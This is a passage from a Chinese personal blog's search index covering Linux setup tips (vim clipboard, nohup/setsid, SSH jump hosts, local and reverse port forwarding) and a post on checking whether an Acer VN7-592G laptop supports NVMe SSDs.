</ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim-\u590d\u5236\u7c98\u8d34\u7cfb\u7edf\u526a\u8d34\u677f","title":"vim \u590d\u5236\u7c98\u8d34\uff08\u7cfb\u7edf\u526a\u8d34\u677f\uff09","text":"<ol> <li> <p>\u9996\u5148\u786e\u8ba4 vim \u662f\u5426\u5f00\u542f\u4e86 clipboard \u529f\u80fd</p> <pre><code>vim --version |grep clipboard #\u5982\u679c\u663e\u793a\u51fa-clipboard \u5219\u9700\u8981\u91cd\u88c5 vim\n</code></pre> <p>\u5982\u679c\u6ca1\u6709\u5219\u91cd\u88c5</p> <pre><code>sudo apt remove vim\nsudo apt install vim-gtk\n</code></pre> </li> <li> <p>\u4f7f\u7528\u9f20\u6807\u9009\u4e2d\u5185\u5bb9\uff0c\u8f93\u5165<code>\"+y</code>\u547d\u4ee4\u4fbf\u53ef\u5c06\u5185\u5bb9\u590d\u5236\u5230\u526a\u8d34\u677f\u3002</p> <p>\u4f7f\u7528<code>\"+p</code>\u5c06\u526a\u8d34\u677f\u5185\u5bb9\u5230\u5f53\u524d\u4f4d\u7f6e\u3002</p> <p>\u6216\u8005</p> <p>\u7136\u540e\u5728.vim/vimrc\u4e2d\u8bbe\u7f6e\u5feb\u6377\u952ectrl-c, ctrl-v\u3002</p> <pre><code>\"clipboard\nmap &lt;C-c&gt; \"+y&lt;CR&gt;\nmap &lt;C-v&gt; \"+p&lt;CR&gt;\n</code></pre> <p>\u6b64\u65f6\u4fbf\u53ef\u4ee5\u5728\u9009\u4e2d\u5185\u5bb9\u65f6\u6309ctrl-c\u590d\u5236\u5230\u7cfb\u7edf\u526a\u5207\u677f\u3002\u5904\u4e8enormal\u6a21\u5f0f\u65f6ctrl-v\u7c98\u8d34\u4e86\u3002</p> </li> </ol>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u89e3\u91ca","title":"\u89e3\u91ca","text":"<p>vim \u4e2d\u5305\u542b\u8bb8\u591a\u4e0d\u540c\u529f\u80fd\u7684\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u5b58\u50a8\u5728 vim \u4e2d\u590d\u5236\u7684\u5185\u5bb9\u3002\u53ef\u4ee5\u901a\u8fc7:reg \u547d\u4ee4\u67e5\u770b vim \u4e2d\u5404\u5bc4\u5b58\u5668\u7684\u503c</p> <pre><code>:reg #\u67e5\u770bvim\u4e2d\u7684\u5bc4\u5b58\u5668\n\n    \"\"      // \u9ed8\u8ba4unnamed\u5bc4\u5b58\u5668\uff0c\u6700\u8fd1\u4e00\u6b21\"d\",\"c\",\"s\",\"x\",\"y\"\u590d\u5236\uff0c\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\n    \"0      // \u6700\u8fd1\u4e00\u6b21\"y\"\u590d\u5236\u5185\u5bb9\n    \"1      // \u6700\u8fd1\u4e00\u6b21\"d\",\"c\",\"s\",\"x\"\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\n    \"2      // \u4e0a\u4e00\u6b21\"d\",\"c\",\"s\",\"x\"\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\uff0c[3-9]\u7c7b\u63a8\n    \"a      // \u5b57\u6bcd\u5bc4\u5b58\u5668\uff0c\u4f9b\u7528\u6237\u6307\u5b9a\u4f7f\u7528\uff0c\u6bd4\u5982\"ay\u5c31\u662f\u590d\u5236\u5230\"a\u5bc4\u5b58\u5668\uff0c[b-z]\u7c7b\u63a8\n    \"-      // \u5c11\u4e8e\u4e00\u884c\u7684\"d\",\"c\",\"x\"\u5220\u9664\u5185\u5bb9\n    \".      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \":      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \"%      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \"#      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n\n    \"+      // \u6620\u5c04\u7cfb\u7edf\u526a\u8d34\u677f (\u6709\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u652f\u6301)\n    \"*      // \u6620\u5c04\u7cfb\u7edf\u526a\u8d34\u677f (\u6709\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u652f\u6301)\n</code></pre> <p>vim \u9ed8\u8ba4\u590d\u5236\u5230\u7684\u5bc4\u5b58\u5668\u662f<code>\"\"</code>\u5bc4\u5b58\u5668\uff0c\u8981\u60f3\u590d\u5236\u5230\u7cfb\u7edf\u526a\u5207\u677f\uff0c\u53ef\u4ee5\u901a\u8fc7<code>\"+</code>\u5bc4\u5b58\u5668\uff08\u9700\u8981 vim \u5f00\u542f clipboard \u529f\u80fd\uff09</p> <p>\u5728\u9009\u4e2d\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u6309<code>y</code>\u9ed8\u8ba4\u5c06\u5185\u5bb9\u590d\u5236\u5230<code>\"\"</code>\u5bc4\u5b58\u5668\u3002\u6309<code>p</code>\u9ed8\u8ba4\u5c06<code>\"\"</code>\u5bc4\u5b58\u5668\u5185\u5bb9\u590d\u5236\u5230\u5f53\u524d\u4f4d\u7f6e\u3002\u8981\u60f3\u590d\u5236\u5230\u6307\u5b9a\u5bc4\u5b58\u5668\uff0c\u8f93\u5165\u5bc4\u5b58\u5668\u540d+y \u5373\u53ef\uff0c\u7c98\u8d34\u65f6\u540c\u7406\u3002</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim-redo","title":"vim redo","text":"<pre><code>undo: u\nredo: ctrl + r\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u9000\u51fa\u7ec8\u7aef\u540e\u547d\u4ee4\u4e0d\u9000\u51fa","title":"\u9000\u51fa\u7ec8\u7aef\u540e\u547d\u4ee4\u4e0d\u9000\u51fa","text":"<p>\u5173\u95ed\u7ec8\u7aef\u540e\uff0cshell \u7ed9\u7a0b\u5e8f\u53d1\u9001 SIGHUP \u4fe1\u53f7\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u9000\u51fa\u3002</p> <p>\u4f1a\u8bdd(session)\uff0c\u8fdb\u7a0b\u7ec4\uff0c\u63a7\u5236\u7ec8\u7aef\u7684\u6982\u5ff5\u3002</p> <ul> <li>nohup command</li> <li>setsid command<ul> <li>\u5c06 command \u653e\u5728\u65b0\u7684 session \u4e2d\u6267\u884c</li> </ul> </li> <li><code>(cmd &amp;)</code><ul> <li>\u539f\u7406\uff1a\u62ec\u53f7\u4ea7\u751f\u5b50 shell\uff0c\u5b50 shell \u6267\u884c cmd &amp;\u3002cmd &amp; \u5bfc\u81f4</li> </ul> </li> </ul> <p>Q: <code>(while true; do sleep 1; echo xxx; done &amp;)</code>\u5982\u4f55\u6740\u6389</p> <p>\u8fdb\u7a0b\u6811\u7ed3\u6784\uff1a</p> <ul> <li>zsh: \u5f53\u524dssh zsh<ul> <li>zsh: \u62ec\u53f7\u4ea7\u751f\u4e00\u4e2a\u5b50shell<ul> <li>zsh: \u540e\u53f0\u6267\u884c\u4e00\u4e2ashell\u811a\u672c\uff0c\u53c8\u4ea7\u751f\u4e00\u4e2ashell<ul> <li>sleep, echo: shell\u96941s\u6267\u884c\u4e00\u6b21echo</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#ssh-\u7684\u6709\u7528\u529f\u80fd","title":"ssh \u7684\u6709\u7528\u529f\u80fd","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#jump","title":"jump","text":"<p>\u8df3\u8dc3\u8fde\u63a5\uff0c\u4f7f\u7528\u4e2d\u95f4\u8282\u70b9\u8fdb\u884c\u4ee3\u7406\uff0c\u8bbf\u95ee\u53e6\u4e00\u53f0 ssh \u670d\u52a1\u5668\u3002</p> <pre><code>ssh -J user@middle:port user@target -p port\n\nssh -J root@192.168.36.1:2202 root@192.168.36.254 -p 2202\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6b63\u5411\u8f6c\u53d1","title":"\u6b63\u5411\u8f6c\u53d1","text":"<p>\u4f7f\u7528 ssh \u53ef\u4ee5\u5728\u4e24\u53f0\u673a\u5668\u95f4\u5efa\u7acb\u4e00\u6761\u52a0\u5bc6\u7684\u96a7\u9053\uff0c\u5e76\u4e14\u8fd8\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ece\u4e00\u53f0\u673a\u5668\u8f6c\u53d1\u5230\u53e6\u4e00\u53f0\u673a\u5668\u3002\u4f7f\u7528\u573a\u666f\u6709\uff1a</p> <ul> <li>A \u80fd\u8bbf\u95ee B\uff0cB \u80fd\u8bbf\u95ee C\uff0c\u4f46\u662f A \u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee C\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528 ssh \u5c06 A \u7684\u6d41\u91cf\u8f6c\u53d1\u5230 B\uff0c\u7136\u540e\u8bbf\u95ee C</li> </ul> <ul> <li>vnc \u8fde\u63a5\u65f6\u901a\u8fc7 ssh \u5efa\u7acb\u52a0\u5bc6\u96a7\u9053\uff0c\u66f4\u52a0\u5b89\u5168</li> </ul> <pre><code>ssh -L 59000:localhost:5901 -C -N -l server_user_name server_ip_address\n</code></pre> <ul> <li>-L 59000:localhost:5901   The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</li> <li>-C: This argument speeds up processes and minimizes resource usage.</li> <li>-N: This argument prevents execution of remote commands and tells SSH to only forward ports.</li> <li>-l server_user_name server_ip_address: This line specifies the user you will use to login to the server.</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\u53cd\u5411\u4ee3\u7406","title":"\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\uff08\u53cd\u5411\u4ee3\u7406\uff09","text":"<p>\u8fdc\u7a0b\u673a\u6bd4\u5982\u670d\u52a1\u5668\u53ef\u80fd\u5904\u4e8e\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8bbf\u95ee\u7f51\u7edc\u3002\u53ef\u4ee5\u901a\u8fc7 ssh \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5177\u4f53\u8fc7\u7a0b\u4e3a\uff1a</p> <ul> <li>\u901a\u8fc7 ssh\uff0c\u5728\u672c\u5730\u673a\u548c\u8fdc\u7a0b\u673a\u4e0a\u5efa\u7acb\u4e00\u6761\u96a7\u9053\u3002</li> <li>\u672c\u5730\u673a\u4e0a\u5f00\u542f\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u6bd4\u5982 clash\u3002</li> <li>\u8fdc\u7a0b\u673a\u4e0a\u914d\u7f6e\u7f51\u7edc\u8bbf\u95ee\u4f7f\u7528\u4ee3\u7406\uff08\u5730\u5740\u4f7f\u7528 localhost\uff09</li> <li>\u8fdc\u7a0b\u673a\u8bbf\u95ee\u4ee3\u7406\u7684\u7aef\u53e3\u65f6\uff0c\u4f1a\u88ab ssh \u8f6c\u53d1\u7ed9\u672c\u5730\u673a\uff0c\u4f5c\u4e3a\u672c\u5730\u6d41\u91cf\u3002\u56e0\u6b64\u8be5\u8bbf\u95ee\u4f1a\u53d1\u9001\u7ed9\u672c\u5730\u7684\u4ee3\u7406\u670d\u52a1\uff0c\u5b9e\u73b0\u4e0a\u7f51\u3002</li> </ul> <p>\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u7684\u6838\u5fc3\u662f\uff0c\u670d\u52a1\u5668\u80fd\u8bbf\u95ee\u672c\u5730\u673a\u7684\u4ee3\u7406\u670d\u52a1\u3002\u800c\u8fd9\u662f\u901a\u8fc7 ssh \u7684\u53cd\u5411\u8f6c\u53d1\u5b9e\u73b0\u7684\u3002\u5bf9\u5e94\u7684\u9009\u9879\u4e3a\uff1a</p> <pre><code>ssh -fNgR 11223:127.0.0.1:11223 server\n</code></pre> <ul> <li>f\uff1a\u8868\u793a\u540e\u53f0\u6267\u884c</li> <li>N\uff1a\u8868\u793a ssh \u4e0d\u7528\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4</li> <li>g\uff1a\u8868\u793a Allows remote hosts to connect to local forwarded ports.  If used on a multiplexed connection, then this option must be specified on the master process.</li> <li> <p>\u5176\u4e2d\u5173\u4e8e R \u7684\u89e3\u91ca\uff0c\u4f5c\u7528\u7c7b\u4f3c\u4e8e-L\uff0c\u53ea\u4e0d\u8fc7\u53cd\u4e86\u8fc7\u6765\u3002</p> <pre><code>-R [bind_address:]port\n             Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side.\n\n             This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to\n             this port or Unix socket, the connection is forwarded over the secure channel, and a connection is made from the local machine to either an\n             explicit destination specified by host port hostport, or local_socket, or, if no explicit destination was specified, ssh will act as a\n             SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.\n\n             Port forwardings can also be specified in the configuration file.  Privileged ports can be forwarded only when logging in as root on the\n             remote machine.  IPv6 addresses can be specified by enclosing the address in square brackets.\n\n             By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a\n             bind_address.  An empty bind_address, or the address \u2018*\u2019, indicates that the remote socket should listen on all interfaces.  Specifying a\n             remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5)).\n\n             If the port argument is \u20180\u2019, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used\n             together with -O forward the allocated port will be printed to the standard output.\n</code></pre> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/02/08/2021-02-08-%E6%9B%B4%E6%96%B0%E5%9B%BA%E6%80%81%E4%B9%8B%E6%97%85/","title":"\u66f4\u65b0\u56fa\u6001\u4e4b\u65c5","text":"<p>\u6211\u59d0\u7684\u7535\u8111\u662f 15-16 \u5e74\u4e70\u7684\uff0c\u578b\u53f7\u4e3a Acer Aspire V15 Nitro Black Edition(\u6697\u5f71\u9a91\u58eb 2\uff0c\u7cbe\u786e\u578b\u53f7\u4e3a Aspire VN7-592G-58NG)\uff0cZOL\u4e0a\u7684\u5546\u54c1\u4fe1\u606f</p> <p>\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u53f0\u7535\u8111\u786e\u5b9e\u662f\u975e\u5e38\u5389\u5bb3\u4e86\uff0c\u6709\u4ee5\u4e0b\u8fd9\u4e9b\u4eae\u773c\u7684\u5730\u65b9\u3002</p> <ul> <li>i5-6300HQ\u3002HQ \u8868\u793a\u6807\u538b - \u56db\u6838\u3002</li> <li>NIVIDIA \u7684 GTX960M \u72ec\u7acb\u663e\u5361\u3002\uff08\u5f53\u65f6\u7684\u4e2d\u7aef\u4e3b\u6d41\u663e\u5361\uff09</li> </ul> <p>\u4e0b\u9762\u8fd9\u4e9b\u5373\u4f7f\u662f\u73b0\u5728\u4e5f\u662f\u5b8c\u5168\u591f\u7528\u7684\uff0c\u7279\u522b\u662f\u90a3\u4e2a\u652f\u6301 2x2 MU-MIMO \u7684\u65e0\u7ebf\u7f51\u5361\u3002</p> <ul> <li>Realtek 8168/8111 \u5343\u5146\u4ee5\u592a\u7f51\u5361\u3002</li> <li>Qualcommm Atheros NFA344A \u65e0\u7ebf\u7f51\u5361\u3002\uff08\u652f\u6301 2x2 MU-MIMO\uff0cWifi4, Wifi5\uff09https://oemdrivers.com/network-qualcomm-atheros-qca61x4a-wireless</li> <li>1 \u4e2a USB 2.0\uff0c 2 \u4e2aUSB 3.0\uff0c1 \u4e2aThunderbolt 3\u63a5\u53e3\u3002s</li> </ul> <p>\u800c\u4e0d\u4ec5\u9650\u4e8e\u6b64\uff0c\u8fd9\u53f0\u7535\u8111\u7684\u6269\u5c55\u6027\u662f\u771f\u7684\u975e\u5e38\u4e0d\u9519\u3002</p> <ul> <li>2 \u6761\u5185\u5b58\u6761\u63d2\u69fd\u3002\u652f\u6301\u6700\u5927 32G\uff08\u539f\u88c5\u4e86\u4e00\u6761\u6d77\u529b\u58eb\u7684 4GB DDR4 2133MHz \u5185\u5b58\u6761\uff09</li> <li>\u4e00\u4e2a m.2 \u63d2\u69fd\uff0c\u652f\u6301 NVMe \u534f\u8bae\uff08PCIe Gen3x4\uff0c\u6700\u9ad8 4GB/s\uff09\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u53d1\u73b0\u8fd9\u53f0\u7535\u8111\u652f\u6301 NVMe \u534f\u8bae\u7684\u56fa\u6001\u7684\u66f2\u6298\u8fc7\u7a0b\uff1a</p> <p>\u5728\u9605\u8bfb\u4e4b\u524d\uff0c\u9700\u8981\u4ee5\u4e0b\u77e5\u8bc6\uff1a</p> <ul> <li>m.2 \u63a5\u53e3\uff08\u4e5f\u53eb NGFF(Next Generation Form Factor)\uff09</li> <li>NVMe</li> </ul> <p>\u5728\u62c6\u673a\u540e\u53d1\u73b0\u7535\u8111\u6709 m.2 \u63a5\u53e3\uff0c\u5982\u56fe\uff1a</p> <p></p> <p>\u6b64\u65f6\uff0c\u5929\u771f\u7684\u4ee5\u4e3a\u6709 m.2 \u63a5\u53e3\u5c31\u662f\u8981\u4e70 NVMe \u7684\u56fa\u6001\u786c\u76d8\u3002\u5728\u7ecf\u8fc7\u641c\u7d22\u540e\u624d\u77e5\u9053 m.2 \u63a5\u53e3\u7684\u4e5f\u6709 SATA \u7248\u672c\u7684\u56fa\u6001\u786c\u76d8\u3002\u7136\u540e\u5c31\u9762\u4e34\u7740\u5982\u4f55\u53bb\u786e\u8ba4\u81ea\u5df1\u7535\u8111\u7684 m.2 \u63a5\u53e3\u662f\u5426\u652f\u6301 NVMe \u534f\u8bae\u7684\u95ee\u9898\u3002\uff08\u56e0\u4e3a NVMe \u7684\u5feb\u975e\u5e38\u591a\uff09</p> <p>\u6b64\u65f6\u76f4\u63a5\u53bb\u641c\u7d22\u201c\u5982\u4f55\u786e\u8ba4\u81ea\u5df1\u7535\u8111\u662f\u5426\u652f\u6301 NVMe\u201d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u80fd\u4f1a\u5f97\u5230\u8fd9\u4e9b\u7b54\u6848\uff08\u5176\u5b83\u7b54\u6848\u53c2\u8003\u6027\u4e0d\u662f\u5f88\u5927\uff09</p> <ul> <li>m.2 \u63a5\u53e3\u5206\u4e3a B key \u548c M key \u7684\u5f62\u72b6\uff08\u7f3a\u53e3\u5728\u5de6\u8fb9\u548c\u7f3a\u53e3\u5728\u53f3\u8fb9\uff09\u3002B key \u7684\u8d70\u7684\u662f SATA \u901a\u9053\uff0c\u4e0d\u652f\u6301\u3002M key \u7684\u53ef\u80fd\u652f\u6301\uff0c\u770b\u4e3b\u677f\u4e0a m.2 \u63a5\u53e3\u65c1\u8fb9\u662f\u5426\u6709 PCIe \u7684\u6807\u8bc6\u3002</li> <li>\u770b BIOS \u662f\u5426\u6709 NVMe \u76f8\u5173\u7684\u9009\u9879\u3002</li> </ul> <p>\u4f46\u662f\u9057\u61be\u7684\u662f\uff0cBIOS \u4e2d\u6211\u6ca1\u6709\u770b\u5230\u76f8\u5173\u8bbe\u7f6e\uff0c\u4e5f\u6ca1\u770b\u5230 PCIe \u7684\u6807\u8bc6\u3002</p> <p>\u5728\u8fdb\u884c\u4e0a\u4e00\u6b65\u7684\u540c\u65f6\uff0c\u6211\u4e5f\u53bb Acer \u652f\u6301\u7f51\u7ad9](https://www.acer.com.cn/support.html?type=1) \u641c\u7d22\u4e86\u4ea7\u54c1\u4fe1\u606f\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u627e\u5230\u9a71\u52a8\u7684\u6587\u4ef6\uff0c\u4e0d\u8fc7\u770b\u4e0d\u5230\u4ea7\u54c1\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p></p> <p>\u7136\u540e\u5076\u7136\u53d1\u73b0\uff0c\u5728\u9999\u6e2f\u7684\u8fd9\u4e2a\u7f51\u7ad9\u662f\u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u53c2\u6570\u7684</p> <p></p> <p>\u5728\u8fd9\u91cc\u9762\u786e\u5b9e\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u4fe1\u606f\uff0c\u5982\u5185\u5b58\u7684\u63d2\u69fd\u6570\u91cf</p> <p></p> <p></p> <p>\u4f46\u662f\u8fd8\u662f\u627e\u4e0d\u5230\u5173\u4e8e\u90a3\u4e2a m.2 \u63d2\u69fd\u7684\u4fe1\u606f\u3002</p> <p>\u6b64\u65f6\u6211\u90fd\u6bd4\u8f83\u503e\u5411\u4e8e\u8ba4\u4e3a\u8fd9\u4e2a m.2 \u63d2\u69fd\u4e0d\u652f\u6301 NVMe \u4e86\uff0c\u8fd9\u65f6\u53c8\u627e\u5230\u4e86\u4e00\u7bc7\u77e5\u4e4e\u7684\u56de\u7b54\u3002</p> <p></p> <p>\u6211\u9a6c\u4e0a\u53bb\u770b\u4e86\u4e0b\u7535\u8111\u7684\u82af\u7247\u7ec4\u578b\u53f7\u3002\u5728\u5b98\u7f51\u4e0a\u627e\u5230\u7684\u53c2\u6570\u5df2\u7ecf\u8868\u660e\u4e86\u82af\u7247\u7ec4\u4e3a intel HM170 Express\u3002\u867d\u7136\u4e0a\u9762\u7684\u77e5\u4e4e\u56de\u7b54\u5199\u4e86 HM170 \u652f\u6301\uff0c\u4f46\u662f\u4fdd\u9669\u8d77\u89c1\u8fd8\u662f\u53bb\u641c\u7d22\u4e00\u4e0b\u3002\u76f4\u63a5\u641c\u7d22\u82af\u7247\u578b\u53f7\uff0c\u53ef\u4ee5\u627e\u5230 intel \u5b98\u7f51\u7684\u4fe1\u606f\u3002</p> <p></p> <p>\u867d\u7136\u5176\u89c4\u683c\u53c2\u6570\u91cc\u63d0\u5230\u4e86\u5f88\u591a PCIe\uff0c\u4f46\u662f\u6b64\u65f6\u6211\u5bf9\u82af\u7247\u7ec4\u7684\u6982\u5ff5\u4ee5\u53ca\u4f5c\u7528\u4e0d\u662f\u5f88\u4e86\u89e3\uff0c\u4e0d\u592a\u6e05\u695a\u5176\u548c\u56fa\u6001\u786c\u76d8\u7684\u5173\u7cfb\u3002\u6240\u4ee5\u8fd8\u662f\u4e0d\u662f\u5f88\u786e\u5b9a\u3002</p> <p>\u6700\u540e\u5728\u4e0b\u9762\u7684\u76f8\u5173\u6750\u6599\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a\u66f4\u8be6\u7ec6\u7684\u6587\u6863</p> <p></p> <p>\u5176\u4e2d\u8d6b\u7136\u5199\u7740\u652f\u6301 NVMe \u7684\u56fa\u6001\u786c\u76d8\u3002</p> <p></p> <p>\u6b64\u65f6\u60ac\u7740\u7684\u5fc3\u843d\u4e0b\u4e86\u4e00\u534a\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u7591\u95ee\uff08\u6b64\u65f6\u6211\u5bf9\u82af\u7247\u7ec4 (chipset) \u8fd8\u6709\u4e3b\u677f (motherboard) \u4e4b\u95f4\u7684\u5173\u7cfb\u4e0d\u662f\u5f88\u6e05\u695a\uff09\uff1a\u4e3b\u677f\u662f Acer \u5236\u9020\u7684\uff0c\u800c\u82af\u7247\u7ec4\u662f intel \u751f\u4ea7\u7684\u3002\u4f1a\u4e0d\u4f1a\u51fa\u73b0\u867d\u7136\u82af\u7247\u652f\u6301 PCIe x4 \u7684 NVMe \u7684\u56fa\u6001\uff0c\u4f46\u662f\u4e3b\u677f\u628a\u8fd9\u4e2a\u529f\u80fd\u9609\u5272\u6389\u4e86\u5462\uff1f</p> <p>\u6b64\u65f6\u6211\u89c9\u5f97\u8fd8\u662f\u53bb\u641c\u7d22\u4e00\u4e0b\u522b\u4eba\u5bf9\u8fd9\u53f0\u7535\u8111\u7684\u8bc4\u6d4b\u6bd4\u8f83\u597d\u3002\u8fd9\u6b21\u6211\u76f4\u63a5\u8bd5\u7740\u7528 google \u641c\u7d22\u4ee5\u4e0b\u5173\u952e\u5b57\uff08\u4e4b\u524d\u641c\u7d22\u62c6\u673a\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u4e2d\u6587\u627e\u4e0d\u5230\u592a\u591a\u4fe1\u606f\uff09\uff1a</p> <p>\"Does Apsire VN7-592G support NVMe SSD\"</p> <p>\u597d\u5bb6\u4f19\u3002\u3002\u3002</p> <p></p> <p>\u70b9\u51fb\u8fdb\u53bb\uff0c\u5c31\u770b\u5230\u8fd9\u4e48\u76f4\u63a5\u7684\u7b54\u6848\u3002\u3002\u3002</p> <p></p> <p>\u4ee5\u4e0a\u5c31\u662f\u6211\u786e\u5b9a\u8fd9\u53f0\u7535\u8111\u80fd\u5426\u88c5 NVMe \u56fa\u6001\u7684\u53ca\u5176\u66f2\u6298\u7684\u8fc7\u7a0b\u3002\u7ed3\u679c\u539f\u6765\u53ea\u9700\u8981 google \u4e00\u4e0b\u3002\u3002\u3002(\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4e2d\u6587\u662f\u641c\u7d22\u4e0d\u5230\u7684)</p> <p>\u540e\u7eed\uff1a</p> <p>\u9646\u7eed\u641c\u7d22\u53c8\u53d1\u73b0</p> <ul> <li> <p>BIOS \u6709 bug</p> <p>https://community.acer.com/en/discussion/443066/acer-vn7-592g-nvme-support</p> <p>\u8fd9\u91cc\u786e\u8ba4\u4e86\u7535\u8111\u7684 m.2 \u63a5\u53e3\u652f\u6301 NVMe\uff0c\u4e14 m.2 \u7684\u89c4\u683c\u662f 80mm x 22mm</p> <p></p> <p>\u8fd9\u91cc\u63d0\u5230\u6709 Bug\uff0c\u4e14\u8be5\u5e16\u5b50\u540e\u9762\u4e5f\u6ca1\u6709\u5b98\u65b9\u89e3\u51b3</p> <p></p> <p>https://community.acer.com/en/discussion/551094/acer-aspire-v-nitro-592g-ssd-m-2-or-nvme</p> <p>\u8fd9\u91cc\u8fd8\u662f\u63d0\u5230\u6709 bug</p> <p></p> </li> </ul> <ul> <li> <p>\u53f0\u6e7e\u7684\u4e00\u4e2a\u5173\u4e8e\u5347\u7ea7 NVMe SSD \u7684\u5e16\u5b50</p> <p>https://www.mobile01.com/topicdetail.php?f=232&amp;t=4728385</p> <p>\u4ed6\u8fd9\u91cc\u63d0\u5230\u652f\u6301 NVMe \u7684\u4e24\u4e2a\u6761\u4ef6</p> <ol> <li> <p>\u4e3b\u677f\u7684 m.2 \u63a5\u53e3\u6709\u5b9e\u8d28\u7684 PCIe \u7ebf\u8def</p> <p></p> <p></p> </li> <li> <p>\u7b2c\u4e8c\u70b9 BIOS \u8981\u652f\u6301</p> <p></p> </li> </ol> </li> </ul> <ul> <li> <p>\u5173\u4e8e m.2 \u7684 slot \u662f\u5426\u652f\u6301 SATA</p> <ol> <li>SATA \u7684 SSD \u6709 B key \u548c M+B key \u4e24\u79cd\uff0cNVMe \u7684 SSD \u53ea\u6709 M key \u4e00\u79cd</li> <li>m.2 m key \u65e2\u652f\u6301 NVMe\uff0c\u53c8\u652f\u6301 SATA\uff08\u5927\u90e8\u5206\uff09</li> </ol> </li> </ul> <ul> <li>\u603b\u7ed3 m.2, SATA, PCIe, AHCI, NVMe \u7684\u81ea\u6211\u7406\u89e3\uff08\u53ef\u80fd\u4f1a\u6709\u9519\u8bef\uff0c\u66f4\u65b0\u4e2d\uff09<ol> <li>m.2\u3001SATA \u548c PCIe \u662f\u4e00\u79cd\u63a5\u53e3\uff0c\u8fd9\u91cc\u7684\u63a5\u53e3\u6307\u7684\u662f\u4e24\u4e2a\u7ec4\u4ef6\u7684\u8fde\u63a5\u90e8\u5206\u3002</li> <li>SATA \u548c PCIe \u4e5f\u662f\u4e00\u79cd\u603b\u7ebf\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u6570\u636e\u548c\u63a7\u5236\u4fe1\u53f7\u4f20\u8f93\u7684\u901a\u8def\u3002</li> <li>AHCI \u548c NVMe \u662f 